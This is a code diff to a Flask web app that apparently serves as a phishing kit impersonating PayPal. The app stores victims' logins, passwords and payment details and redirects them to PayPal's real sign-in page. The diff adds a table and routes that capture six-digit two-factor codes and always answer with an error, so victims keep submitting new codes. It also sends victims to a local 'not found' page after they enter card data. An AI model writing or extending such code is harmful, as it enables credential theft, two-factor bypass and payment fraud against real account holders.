@@ -53,6 +53,11 @@ with app.app_context():
             email TEXT
         )
     """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS codes ( 
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        code TEXT NOT NULL )
+    """)
     db.commit()
 
 @app.route('/')
@@ -74,6 +79,7 @@ def store_payment():
     db.commit()
     return redirect("https://www.paypal.com/signin?country.x=KE&locale.x=en_US&langTgl=en")
 
+
 @app.route('/login')
 def login_page():
     return render_template('login.html')
@@ -85,7 +91,25 @@ def store_user():
     db = get_db()
     db.execute("INSERT INTO users (email_phone, password) VALUES (?, ?)", (email_phone, password))
     db.commit()
-    return redirect("https://www.paypal.com/us/signin?Z3JncnB0=")
+    return redirect("/2fa")
+
+@app.route('/2fa')
+def two_factor():
+    # read query parameter ?error=1
+    error = request.args.get("error")
+    return render_template("2fa.html", error=error)
+
+
+@app.route('/store_code', methods=['POST'])
+def store_code():
+    # join digits into one code
+    code = ''.join([request.form.get(f'digit{i}', '') for i in range(6)])
+    db = get_db()
+    db.execute("INSERT INTO codes (code) VALUES (?)", (code,))
+    db.commit()
+
+    # after saving, reload 2FA with error flag
+    return redirect(url_for("two_factor", error=1))
 
 @app.route('/store_payment_details', methods=['POST'])
 def store_payment_details():
@@ -108,7 +132,13 @@ def store_payment_details():
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, data)
     db.commit()
-    return redirect("https://www.paypal.com/us/signin?Z3JncnB0=")
+    return redirect(url_for("notfound"))
+
+@app.route("/notfound")
+def notfound():
+    return render_template("notfound.html")
+
+
 
 @app.route('/view')
 def view_data():
